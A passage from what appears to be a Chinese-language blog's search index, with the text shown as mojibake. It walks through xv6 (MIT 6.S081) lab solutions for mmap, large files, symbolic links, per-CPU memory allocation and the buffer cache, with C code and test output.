","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:3:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["rust"],"content":"èµ„æ–™æ´å¼• https://doc.rust-lang.org/nomicon/subtyping.html https://en.wikipedia.org/wiki/Type_constructor https://en.wikipedia.org/wiki/Subtyping https://en.wikipedia.org/wiki/Covariance_and_contravariance_(computer_science) https://zhuanlan.zhihu.com/p/41814387 ","date":"2021-04-29","objectID":"/posts/rust-lifetime-variance/:4:0","tags":["rust","variance","subtype"],"title":"Rustç”Ÿå‘½å‘¨æœŸä¸å˜å½¢","uri":"/posts/rust-lifetime-variance/"},{"categories":["OS"],"content":"mmapå’Œmunmapç³»ç»Ÿè°ƒç”¨å…è®¸ UNIX ç¨‹åºå¯¹å…¶åœ°å€ç©ºé—´è¿›è¡Œæ›´ä¸ºç»†è‡´çš„æ§åˆ¶ã€‚å®ƒä»¬å¯ç”¨äºåœ¨è¿›ç¨‹é—´å…±äº«å†…å­˜ï¼Œå°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹åœ°å€ç©ºé—´ï¼Œå¹¶ä½œä¸ºç”¨æˆ·çº§page faultæ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚åœ¨æœ¬å®éªŒå®¤ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨xv6ä¸­æ·»åŠ mmapå’Œmunmapç³»ç»Ÿè°ƒç”¨ï¼Œé‡ç‚¹æ˜¯memory-mapped filesã€‚ ","date":"2021-03-03","objectID":"/posts/6-s081-lab10-mmap/:0:0","tags":["6.S081","mmap"],"title":"6.S081 lab10 mmap","uri":"/posts/6-s081-lab10-mmap/"},{"categories":["OS"],"content":"Lab: mmap mmapçš„ API å¦‚ä¸‹ï¼š void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); åœ¨xv6ä¸­ï¼Œaddrå§‹ç»ˆä¸º 0ï¼Œæ‰€ä»¥ç”±kernelè‡ªè¡Œåˆ¤æ–­åº”å½“ map çš„åœ°å€ï¼›protè¡¨ç¤ºäº† mapped memory çš„ Rã€Wã€X æƒé™ï¼Œflagsä¸ºMAP_SHAREDæˆ–è€…MAP_PRIVATEï¼Œå‰è€…è¡¨ç¤ºå¯¹ mapped memory çš„ä¿®æ”¹åº”å†™å›æ–‡ä»¶ï¼Œåè€…åˆ™ä¸éœ€è¦ï¼›offeræ°¸è¿œä¸º 0ï¼Œä¸ç”¨å¤„ç†æ–‡ä»¶çš„åç§»é‡ï¼›mmap æˆåŠŸå°†è¿”å›å¯¹åº”å†…å­˜èµ·å§‹åœ°å€ï¼›å¤±è´¥è¿”å›0xffffffffffffffffã€‚ munmap(addr, length)éœ€è¦å°†ä» addr å¼€å§‹çš„é•¿åº¦ä¸ºlengthçš„å†…å­˜unmapã€‚å®éªŒæŒ‡å¯¼ä¹¦ä¿è¯è¢«munmapçš„è¿™æ®µå†…å­˜ä½äºmmapå†…å­˜åŒºé—´çš„å¤´éƒ¨/å°¾éƒ¨æˆ–è€…æ˜¯å…¨éƒ¨ï¼Œmunmapä¸ä¼šåœ¨ä¸­é—´æŒ–ä¸€ä¸ªæ´ï¼›å½“å†…å­˜æ˜¯ä»¥MAP_SHAREDæ¨¡å¼è¢«mmapæ—¶ï¼Œéœ€è¦å…ˆå°†ä¿®æ”¹å†™å›æ–‡ä»¶ã€‚ çœ‹å®Œäº†å¯¹äºmmapå’Œmunmapçš„è¦æ±‚ï¼Œå‘ç°å…¶å®æµ‹è¯•æ²¡æœ‰ä¸€äº›æ¯”è¾ƒéš¾çš„caseï¼Œä¸ºæˆ‘ä»¬çš„å®ç°æä¾›äº†ä¾¿åˆ©ã€‚ ä¹‹åï¼Œå°±å¯ä»¥è·Ÿç€ hints å®Œæˆå®éªŒï¼š é¦–å…ˆæ·»åŠ mmapå’Œmunmapçš„ç³»ç»Ÿè°ƒç”¨å£°æ˜ï¼Œå¹¶ä¸”åœ¨Makefileä¸­åŠ å…¥_mmaptestã€‚ å¯¹ mapped memory è¦ä½¿ç”¨ lazy allocationï¼Œå°±åƒåœ¨ä¹‹å‰çš„å®éªŒä¸­é‚£æ ·ï¼Œè¿™æ ·å­ä½¿å¾—æˆ‘ä»¬å¯ä»¥åœ¨ç‰©ç†å†…å­˜æœ‰é™çš„æƒ…å†µä¸‹mmapå°½å¯èƒ½å¤§çš„æ–‡ä»¶ã€‚ è®°å½•mmapä¸ºæ¯ä¸ªè¿›ç¨‹ map æ–‡ä»¶çš„æƒ…å†µï¼Œä¾‹å¦‚åœ°å€ï¼Œé•¿åº¦ï¼Œæƒé™ï¼Œå¯¹åº”çš„æ–‡ä»¶ç­‰ç­‰ã€‚ç”±äºxv6æ²¡æœ‰çœŸæ­£çš„å†…å­˜åˆ†é…å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªå®šé•¿çš„æ•°ç»„å»å­˜å‚¨ï¼Œ16 å°±è¶³å¤Ÿäº†ã€‚ struct VMA { int used; uint64 addr; uint64 end; int prot; int flags; int offset; struct file *f; }; // in struct proc struct VMA vma[NVMA]; uint64 mmap_start; å®ç°mmapï¼Œä»ç”¨æˆ·åœ°å€ç©ºé—´æ‰¾åˆ°ç©ºé—²å¤„ map æ–‡ä»¶ï¼Œä¿®æ”¹å¯¹åº”çš„VMAç»“æ„ä½“è®°å½•ï¼Œå½“å¯¹æ–‡ä»¶mmapåï¼Œåº”å½“å¢åŠ æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°(filedup)ï¼Œè¿™æ ·å½“æ–‡ä»¶è¢«å…³é—­æ—¶ï¼ŒVMAæŒæœ‰çš„æ–‡ä»¶æŒ‡é’ˆæ‰ä¸ä¼šå¤±æ•ˆã€‚ æœ€é‡è¦çš„å°±æ˜¯æ‰¾åˆ°åˆé€‚çš„ç©ºé—²åœ°å€ï¼Œç”¨äºmmapã€‚xv6çš„ç”¨æˆ·åœ°å€ç©ºé—´å¦‚ä¸‹å›¾ï¼š æœ€é¡¶éƒ¨æ˜¯trampolineå’Œtrapframeï¼Œå®ƒä»¬å ç”¨äº†ä¸¤ä¸ª pageï¼Œå’Œstackä¹‹é—´æœ‰å¾ˆå¤§çš„ç©ºé—²åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶ map åˆ°trapframeä¹‹ä¸‹ï¼Œä¸æ–­å‘ä¸‹å¢é•¿ï¼Œmmap_startè®°å½•ç€trapframeä¸‹å¯ç”¨äºmmapçš„èµ·å§‹åœ°å€ï¼Œåˆå§‹å€¼ä¸ºPGROUNDDOWN(MAXVA - (2 * PGSIZE))ã€‚ uint64 sys_mmap(void) { int length, prot, flags, fd; struct file *f; if(argint(1, \u0026length) \u003c 0 || argint(2, \u0026prot) \u003c 0 || argint(3, \u0026flags) \u003c 0 || argfd(4, \u0026fd, \u0026f) \u003c 0) { return 0xffffffffffffffff; } if (!f-\u003ewritable \u0026\u0026 flags == MAP_SHARED \u0026\u0026 (prot \u0026 PROT_WRITE)) { return 0xffffffffffffffff; } // find a vma struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(!v-\u003eused) { break; } } if(v == p-\u003evma + NVMA) { return -1; } filedup(f); v-\u003eaddr = PGROUNDDOWN(p-\u003emmap_start - length); v-\u003eend = v-\u003eaddr + length; p-\u003emmap_start = v-\u003eaddr; v-\u003eused = 1; v-\u003ef = f; v-\u003eprot = prot; v-\u003eflags = flags; v-\u003eoffset = 0; return v-\u003eaddr; } å½“å‘ç”Ÿpage faultæ—¶ï¼Œä¸ºå…¶åˆ†é…ä¸€ä¸ªçœŸå®çš„ç‰©ç†é¡µé¢ï¼Œä½¿ç”¨readiå°†æ–‡ä»¶å†…å®¹è¯»å…¥å†…å­˜ï¼Œç„¶åå°†ç‰©ç†é¡µé¢ map åˆ°ç”¨æˆ·åœ°å€ç©ºé—´ï¼Œè®°å¾—æ­£ç¡®è®¾ç½®é¡µé¢çš„æƒé™ã€‚ else if (r_scause() == 13 || r_scause() == 15) { uint64 va = r_stval(); if (va \u003e MAXVA) { p-\u003ekilled = 1; } else { if(mmap_alloc(p-\u003epagetable, va) \u003c 0) { p-\u003ekilled = 1; } } } int mmap_alloc(pagetable_t pagetable, uint64 va) { char *mem; struct proc *p = myproc(); struct VMA *v; // find vma struct for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 va \u003e= v-\u003eaddr \u0026\u0026 va \u003c v-\u003eend) { break; } } if (v == p-\u003evma + NVMA) { return -1; } mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); begin_op(); ilock(v-\u003ef-\u003eip); int len; if((len = readi(v-\u003ef-\u003eip, 0, (uint64)mem, va - v-\u003eaddr, PGSIZE)) \u003c 0) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); int f = PTE_U | (v-\u003eprot \u003c\u003c 1); if(mappages(pagetable, va, PGSIZE, (uint64)mem, f) != 0) { kfree(mem); return -1; } return 0; } å®ç°munmapï¼Œæ‰¾åˆ°å¯¹åº”çš„VMAï¼Œä½¿ç”¨uvmunmap unmap å¯¹åº”çš„å†…å­˜ï¼Œå½“ä¸€ä¸ªmmapçš„æ‰€æœ‰å†…å­˜éƒ½è¢« unmap æ—¶ï¼Œéœ€è¦å‡å°‘å¯¹åº”æ–‡ä»¶çš„å¼•ç”¨è®¡æ•°ï¼›å¦‚æœå†…å­˜è¢«ä¿®æ”¹è¿‡ï¼Œä¸”æ˜¯ä»¥MAP_SHAREDæ¨¡å¼è¢«mmapï¼Œé‚£ä¹ˆéœ€è¦å…ˆå°†å†…å­˜å†…å®¹å†™å›æ–‡ä»¶ã€‚ç†æƒ³æ€ä¸‹ï¼Œæˆ‘ä»¬åªåº”å½“å†™å›dirty pageï¼Œä½†æ˜¯æµ‹è¯•ä¸­ä¸ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹ï¼Œæ‰€ä»¥å°†æ‰€æœ‰å†…å­˜å†™å›æ–‡ä»¶å³å¯äº†ã€‚ struct file* fileundup(struct file *f) { acquire(\u0026ftable.lock); if(f-\u003eref \u003c 1) panic(\"filedup\"); f-\u003eref--; release(\u0026ftable.lock); return f; } uint64 sys_munmap(void) { uint64 addr; int length; if(argaddr(0, \u0026addr) \u003c 0 || argint(1, \u0026length) \u003c 0) { return -1; } return s_munmap(addr, length); } uint64 s_munmap(uint64 addr, int length) { struct proc *p = myproc(); struct VMA *v; for (v = p-\u003evma; v \u003c p-\u003evma + NVMA; v++) { if(v-\u003eused \u0026\u0026 v-\u003eaddr \u003c= addr \u0026\u0026 addr + length \u003c= v-\u003eend) { break; } } if(v == p-\u003evma + NVMA) { return -1; } uint64 end = addr + length; uint64 _addr = addr; while (addr \u003c end) { // if already load in if(walkaddr(p-\u003epagetable, addr)) { if(v-\u003eflags == MAP_SHARED \u0026\u0026 v-\u003ef-\u003ewritable) { begin_op(); ilock(v-\u003ef-\u003eip); int size = min(end-addr, PGSIZE); if(writei(v-\u003ef-\u003eip, 1, addr, addr - v-\u003eaddr, size) \u003c size) { iunlock(v-\u003ef-\u003eip); end_op(); return -1; } iunlock(v-\u003ef-\u003eip); end_op(); } uvmunmap(p-\u003epagetable, addr, 1, 1); } addr += PGSIZE; } if(_addr == v-\u003eaddr) { v-\u003eaddr += length; } else if(_addr + length == v-\u003eend) { v-\u003eend -= length; } if (v-\u003eaddr == v-\u003een","date":"2021-03-03","objectID":"/posts/6-s081-lab10-mmap/:1:0","tags":["6.S081","mmap"],"title":"6.S081 lab10 mmap","uri":"/posts/6-s081-lab10-mmap/"},{"categories":["OS"],"content":"Large files æœ¬å…³éœ€è¦ä¸ºxv6æ·»åŠ å¯¹å¤§æ–‡ä»¶çš„æ”¯æŒã€‚xv6çš„ inode é»˜è®¤ä½¿ç”¨ 12 ä¸ªç›´æ¥å—æŒ‡é’ˆå’Œ 1 ä¸ªé—´æ¥å—æŒ‡é’ˆï¼ˆæŒ‡å‘ä¸€ä¸ªå­˜å‚¨ç€å—æŒ‡é’ˆçš„æ•°æ®å—ï¼‰ï¼Œæ‰€ä»¥xv6æ”¯æŒçš„æœ€å¤§æ–‡ä»¶å°ºå¯¸æ˜¯12 + 1*256=268ä¸ª blockã€‚æˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªç›´æ¥å—æŒ‡é’ˆä¿®æ”¹ä¸ºåŒé‡é—´æ¥å—æŒ‡é’ˆï¼ˆæ‰§è¡Œä¸€ä¸ªå­˜å‚¨ç€é—´æ¥å—æŒ‡é’ˆçš„æ•°æ®å—ï¼‰ï¼Œå°†xv6çš„æœ€å¤§æ–‡ä»¶å°ºå¯¸æ‰©å±•åˆ°11 + 1*256 + 1*256*256= 65803ä¸ª blockã€‚ é¦–å…ˆæˆ‘ä»¬ä¿®æ”¹kernel/fs.hä¸­çš„ç›¸å…³å®å®šä¹‰ï¼š #define NDIRECT 11 #define NINDIRECT (BSIZE / sizeof(uint)) #define NDOUBLEINDIRECT ((BSIZE / sizeof(uint)) * (BSIZE / sizeof(uint))) #define MAXFILE (NDIRECT + NINDIRECT + NDOUBLEINDIRECT) ç„¶åä¿®æ”¹dinodeå’Œinodeä¸­çš„åœ°å€æ•°ç»„å®šä¹‰ï¼š uint addrs[NDIRECT+2]; æ¥ä¸‹æ¥ä¿®æ”¹bmapå‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨äºå°†ä¸€ä¸ªæ–‡ä»¶çš„é€»è¾‘å—å·è½¬æ¢ä¸ºè®¾å¤‡çš„ç‰©ç†å—å·ï¼Œç±»ä¼¼äºè™šå®åœ°å€è½¬æ¢ï¼š static uint bmap(struct inode *ip, uint bn) { uint addr, *a; struct buf *bp; if(bn \u003c NDIRECT){ if((addr = ip-\u003eaddrs[bn]) == 0) ip-\u003eaddrs[bn] = addr = balloc(ip-\u003edev); return addr; } bn -= NDIRECT; if(bn \u003c NINDIRECT){ // Load indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT]) == 0) ip-\u003eaddrs[NDIRECT] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; if((addr = a[bn]) == 0){ a[bn] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } bn -= NINDIRECT; if(bn \u003c NDOUBLEINDIRECT){ // Load double-indirect block, allocating if necessary. if((addr = ip-\u003eaddrs[NDIRECT+1]) == 0) ip-\u003eaddrs[NDIRECT+1] = addr = balloc(ip-\u003edev); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level1 = bn / NINDIRECT; if((addr = a[level1]) == 0){ a[level1] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); bp = bread(ip-\u003edev, addr); a = (uint*)bp-\u003edata; uint level2 = bn % NINDIRECT; if((addr = a[level2]) == 0){ a[level2] = addr = balloc(ip-\u003edev); log_write(bp); } brelse(bp); return addr; } panic(\"bmap: out of range\"); } ç„¶åä¿®æ”¹itruncå‡½æ•°ï¼Œåœ¨ truncate æ–‡ä»¶æ—¶ï¼Œé‡Šæ”¾æˆ‘ä»¬æ–°æ·»åŠ çš„åŒé‡é—´æ¥æ•°æ®å—ï¼ˆä¸è¦å¿˜äº†é‡Šæ”¾æŒ‡é’ˆå—æœ¬èº«ï¼‰ï¼š void itrunc(struct inode *ip) { int i, j, k; struct buf *bp, *nbp; uint *a, *na; for(i = 0; i \u003c NDIRECT; i++){ if(ip-\u003eaddrs[i]){ bfree(ip-\u003edev, ip-\u003eaddrs[i]); ip-\u003eaddrs[i] = 0; } } if(ip-\u003eaddrs[NDIRECT]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ if(a[j]) bfree(ip-\u003edev, a[j]); } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT]); ip-\u003eaddrs[NDIRECT] = 0; } if(ip-\u003eaddrs[NDIRECT+1]){ bp = bread(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); a = (uint*)bp-\u003edata; for(j = 0; j \u003c NINDIRECT; j++){ // level1 if(a[j]) { nbp = bread(ip-\u003edev, a[j]); na = (uint*)nbp-\u003edata; for(k = 0; k \u003c NINDIRECT; k++) { // level2 if(na[k]) { bfree(ip-\u003edev, na[k]); } } bfree(ip-\u003edev, a[j]); brelse(nbp); } } brelse(bp); bfree(ip-\u003edev, ip-\u003eaddrs[NDIRECT+1]); ip-\u003eaddrs[NDIRECT+1] = 0; } ip-\u003esize = 0; iupdate(ip); } è¿è¡Œbigfileæµ‹è¯•ï¼Œçœ‹åˆ°æµ‹è¯•åˆ›å»ºäº†ä¸€ä¸ª size ä¸º65803ä¸ª block çš„æœ€å¤§æ–‡ä»¶ã€‚ $ bigfile .................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................. wrote 65803 blocks bigfile done; ok ","date":"2021-03-02","objectID":"/posts/6-s081-lab9-fs/:1:0","tags":["6.S081","file system"],"title":"6.S081 lab9 fs","uri":"/posts/6-s081-lab9-fs/"},{"categories":["OS"],"content":"Symbolic links è¿™æ¬¡æˆ‘ä»¬éœ€è¦å®ç°ä¸€ä¸ªsyscallï¼Œç”¨äºåˆ›å»ºç¬¦å·è¿æ¥ï¼Œç¬¦å·é“¾æ¥ä¸ä¼šå¢åŠ å®é™…æ–‡ä»¶inodeçš„ link æ•°ï¼Œåªæ˜¯ä½¿ç”¨è·¯å¾„æŒ‡å‘è¢« link çš„æ–‡ä»¶ã€‚ é¦–å…ˆï¼ŒæŒ‰ç…§ä¹‹å‰ç†Ÿæ‚‰çš„æ–¹æ³•æ·»åŠ æ–°çš„syscallã€‚ åœ¨kernel/stat.hä¸­æ·»åŠ ç¬¦å·æ–‡ä»¶ç±»å‹ï¼š #define T_SYMLINK 4 åœ¨kernel/fcntl.hä¸­æ·»åŠ ï¼š #define O_NOFOLLOW 0x800 ç”¨äºæ ‡è¯†æ˜¯è¦è¯»å–ç¬¦å·æ–‡ä»¶æœ¬èº«è¿˜æ˜¯ç¬¦å·é“¾æ¥æŒ‡å‘çš„æ–‡ä»¶ã€‚ ä¹‹åæˆ‘ä»¬å®ç°symlinkæœ¬èº«ï¼š uint64 sys_symlink(void) { char target[MAXPATH], path[MAXPATH];; struct inode *ip; if(argstr(0, target, MAXPATH) \u003c 0|| argstr(1, path, MAXPATH) \u003c 0) { return -1; } begin_op(); if ((ip = create(path, T_SYMLINK, 0, 0)) == 0){ end_op(); return -1; } int len = strlen(target); // write target path len if(writei(ip, 0, (uint64)\u0026len, 0, sizeof(len)) \u003c sizeof(len)) { iunlockput(ip); end_op(); return -1; } // write target path if(writei(ip, 0, (uint64)target, sizeof(len), len + 1) \u003c 0) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); end_op(); return 0; } é¦–å…ˆæˆ‘ä»¬ä¸ºç¬¦å·æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„inodeï¼Œç„¶åå‘å…¶æ•°æ®åŒºå†™å…¥æŒ‡å‘çš„ç›®æ ‡ã€‚åœ¨å†™å…¥ç›®æ ‡æ—¶ï¼Œä½¿ç”¨äº†[len, target]çš„æ ¼å¼ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä¹‹åèƒ½å‡†ç¡®åœ°ä»æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–å‡ºtargetã€‚ ç„¶åï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹sys_openï¼Œä½¿ä¹‹æ­£ç¡®çš„å¤„ç†ç¬¦å·æ–‡ä»¶ã€‚ Modify the open system call to handle the case where the path refers to a symbolic link. If the file does not exist, open must fail. When a process specifies O_NOFOLLOW in the flags to open, open should open the symlink (and not follow the symbolic link). If the linked file is also a symbolic link, you must recursively follow it until a non-link file is reached. If the links form a cycle, you must return an error code. You may approximate this by returning an error code if the depth of links reaches some threshold (e.g., 10). å½“æ²¡æœ‰è®¾ç½®O_NOFOLLOWæ—¶ï¼Œopenè°ƒç”¨éœ€è¦æ‰“å¼€ç¬¦å·æ–‡ä»¶æŒ‡å‘çš„çœŸå®æ–‡ä»¶ï¼Œå¦‚æœè¢«ç¬¦å·æ–‡ä»¶æŒ‡å‘çš„æ–‡ä»¶ä¹Ÿæ˜¯ç¬¦å·æ–‡ä»¶ï¼Œåˆ™éœ€è¦é€’å½’æŸ¥æ‰¾ï¼ŒæŒ‡å¯¼æ‰¾åˆ°çœŸå®æ–‡ä»¶ã€‚ä¸ºäº†é˜²æ­¢å¾ªç¯å¼•ç”¨ï¼Œå½“æŸ¥æ‰¾æ¬¡æ•°ä¸€å®šæ•°å€¼æ—¶ï¼Œå¯ä»¥åˆ¤æ–­å¤±è´¥ã€‚ #define MAXSYMLINK 10 if (!(omode \u0026 O_NOFOLLOW)) { int cnt = MAXSYMLINK; int len = 0; while (cnt-- \u003e 0) { ilock(ip); if (ip-\u003etype == T_SYMLINK) { if (readi(ip, 0, (uint64)\u0026len, 0, sizeof(len)) \u003c sizeof(len)) { iunlockput(ip); end_op(); return -1; } if (readi(ip, 0, (uint64)path, sizeof(len), len + 1) \u003c len + 1) { iunlockput(ip); end_op(); return -1; } iunlockput(ip); } else { iunlock(ip); break; } if((ip = namei(path)) == 0){ end_op(); return -1; } } if (cnt \u003c= 0) { end_op(); return -1; } } ","date":"2021-03-02","objectID":"/posts/6-s081-lab9-fs/:2:0","tags":["6.S081","file system"],"title":"6.S081 lab9 fs","uri":"/posts/6-s081-lab9-fs/"},{"categories":["OS"],"content":"åœ¨æœ¬å®éªŒå®¤ä¸­ï¼Œå°†é‡æ–°è®¾è®¡ä»£ç ä»¥æé«˜å¹¶è¡Œæ€§ã€‚åœ¨å¤šæ ¸æœºå™¨ä¸Šï¼Œå¹¶è¡Œæ€§å·®çš„ä¸€ä¸ªå¸¸è§ç—‡çŠ¶æ˜¯é«˜å¼ºåº¦çš„é”ç«äº‰ã€‚æé«˜å¹¶è¡Œæ€§é€šå¸¸éœ€è¦æ”¹å˜æ•°æ®ç»“æ„å’ŒåŠ é”ç­–ç•¥ï¼Œä»¥å‡å°‘äº‰ç”¨ã€‚æ‚¨å°†å¯¹ xv6 å†…å­˜åˆ†é…å™¨å’Œæ–‡ä»¶å—ç¼“å­˜è¿›è¡Œæ”¹è¿›ã€‚ ","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:0:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"Memory allocator xv6çš„å†…å­˜åˆ†é…ä¸é‡Šæ”¾ä½¿ç”¨äº†ä¸€ä¸ªå…¨å±€é”kmem.lockï¼Œæ‰€æœ‰ cpu æƒ³è¦åˆ†é…å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œè°ƒç”¨kfree()å’Œkalloc()å°†å¯¹kmem.lockåŠ é”ï¼Œæ‰€ä»¥å¤šçº¿ç¨‹åŒæ—¶è·å–å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œå°†é€ æˆæ¿€çƒˆçš„é”ç«äº‰ã€‚æœ¬æ¬¡å®éªŒå°†ä¸ºæ¯ä¸€ä¸ª cpu å®ç°å•ç‹¬çš„ç©ºé—²å†…å­˜é“¾è¡¨ï¼Œå½“ä¸€ä¸ª cpu æ²¡æœ‰å¯ç”¨å†…å­˜æ—¶ï¼Œä»å¦ä¸€ä¸ª cpuâ€œçªƒå–â€ã€‚ åœ¨æ”¹è¿›ä¹‹å‰ï¼Œè¿›è¡Œkalloctestï¼š $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: kmem: #fetch-and-add 134228 #acquire() 433016 lock: proc: #fetch-and-add 39362 #acquire() 135295 lock: virtio_disk: #fetch-and-add 8435 #acquire() 114 lock: proc: #fetch-and-add 4895 #acquire() 135334 lock: proc: #fetch-and-add 3939 #acquire() 135337 tot= 134228 test1 FAIL start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK å¯ä»¥çœ‹åˆ°kmemé”çš„â€œ#fetch-and-addâ€æ•°å€¼ï¼ˆå³è‡ªæ—‹æ¬¡æ•°ï¼‰éå¸¸é«˜ï¼Œé”ç«äº‰éå¸¸å‰åˆ©ã€‚ éœ€è¦æ³¨æ„ï¼š The function cpuid returns the current core number, but itâ€™s only safe to call it and use its result when interrupts are turned off. You should use push_off() and pop_off() to turn interrupts off and on. ä¿®æ”¹kmemï¼Œkinit()ï¼Œkfreeï¼Œkallocï¼š struct { struct spinlock lock; struct run *freelist; } kmems[NCPU]; char kbuf[NCPU][20]; void kinit() { for (int i = 0; i \u003c NCPU; i++) { snprintf(kbuf[i], 20, \"kmem%d\", i); initlock(\u0026kmems[i].lock, (char*)kbuf[i]); } freerange(end, (void*)PHYSTOP); } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); // Fill with junk to catch dangling refs. memset(pa, 1, PGSIZE); r = (struct run*)pa; // interrupt off push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r-\u003enext = kmems[cpu].freelist; kmems[cpu].freelist = r; release(\u0026kmems[cpu].lock); // interrupt on pop_off(); } void * kalloc(void) { struct run *r; push_off(); int cpu = cpuid(); acquire(\u0026kmems[cpu].lock); r = kmems[cpu].freelist; if(r) kmems[cpu].freelist = r-\u003enext; release(\u0026kmems[cpu].lock); // steal from other cpu if(!r) { for(int i = 0; i \u003c NCPU; i++) { if (i == cpu) continue; acquire(\u0026kmems[i].lock); r = kmems[i].freelist; if (r) { kmems[i].freelist = r-\u003enext; release(\u0026kmems[i].lock); break; } release(\u0026kmems[i].lock); } } pop_off(); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } ä¿®æ”¹åè¿›è¡Œkalloctestï¼š $ kalloctest start test1 test1 results: --- lock kmem/bcache stats lock: kmem0: #fetch-and-add 0 #acquire() 65683 lock: kmem1: #fetch-and-add 0 #acquire() 190628 lock: kmem2: #fetch-and-add 0 #acquire() 176734 lock: bcache: #fetch-and-add 0 #acquire() 1242 --- top 5 contended locks: lock: proc: #fetch-and-add 35310 #acquire() 112156 lock: virtio_disk: #fetch-and-add 11562 #acquire() 114 lock: proc: #fetch-and-add 4717 #acquire() 112193 lock: proc: #fetch-and-add 4242 #acquire() 112196 lock: proc: #fetch-and-add 4058 #acquire() 112181 tot= 0 test1 OK start test2 total free number of pages: 32499 (out of 32768) ..... test2 OK å¯ä»¥çœ‹åˆ°kmemé”ç«äº‰æ¶ˆå¤±äº†ã€‚ ","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:1:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"Buffer cache åœ¨xv6ä¸­ï¼Œä½¿ç”¨buffer cacheç¼“å­˜ä¸€ä¸ªç£ç›˜blockçš„å†…å®¹ï¼Œbcacheä½¿ç”¨ä¸€ä¸ªé”æ¥ç»´æŠ¤ï¼Œæ¯æ¬¡bgetå’Œbrelseéƒ½éœ€è¦è·å–é”ï¼Œè¿™æ ·å°†å¸¦æ¥å¾ˆæ¿€çƒˆçš„é”ç«äº‰ã€‚ åœ¨ä¿®æ”¹å‰ï¼Œbcachetestæµ‹è¯•ç»“æœå¦‚ä¸‹ï¼š $ bcachetest start test0 test0 results: --- lock kmem/bcache stats lock: bcache: #fetch-and-add 90245 #acquire() 65022 --- top 5 contended locks: lock: virtio_disk: #fetch-and-add 157311 #acquire() 1137 lock: bcache: #fetch-and-add 90245 #acquire() 65022 lock: proc: #fetch-and-add 82586 #acquire() 73871 lock: proc: #fetch-and-add 59647 #acquire() 73519 lock: proc: #fetch-and-add 29617 #acquire() 73520 tot= 90245 test0: FAIL start test1 test1 OK æ ¹æ®å®éªŒæŒ‡å¯¼ï¼Œæˆ‘ä»¬å°†bcacheçš„æ•°æ®ç»“æ„ç”±ä¸€ä¸ªåŒå‘é“¾è¡¨æ”¹ä¸ºhashtableï¼Œbucketæ•°é‡ä½¿ç”¨ç´ æ•°æ¥å‡å°‘ hash ç¢°æ’ï¼Œå…¶ä¸­steal_lockæ˜¯æ•´ä¸ªbcacheçš„å¤§é”ã€‚ #define NBUCKET 13 struct { struct buf head[NBUCKET]; struct spinlock lock[NBUCKET]; struct buf buf[NBUF]; struct spinlock steal_lock; } bcache; uint ihash(uint blockno) { return blockno % NBUCKET; } ä¿®æ”¹åˆå§‹åŒ–ä»£ç ï¼Œå°†æ¯ä¸ªbucketæŒ‡å‘çš„bufæ„é€ æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ–¹ä¾¿æŸ¥æ‰¾å¤´å°¾ï¼Œæ¯æ¬¡è¢«é‡Šæ”¾çš„bufå°†è¢«ç§»åˆ°å¤´éƒ¨ï¼Œä»¥å®ç° LRUï¼Œå‡å°‘æŸ¥æ‰¾é•¿åº¦ã€‚ char buf[NBUCKET][20]; void binit(void) { struct buf *b; for (int i = 0; i \u003c NBUCKET; i++) { snprintf(buf[i], 20, \"bcache.bucket%d\", i); initlock(\u0026bcache.lock[i], (char*)buf[i]); } initlock(\u0026bcache.steal_lock, \"bcache\"); for (int i = 0; i \u003c NBUCKET; i++) { // create a 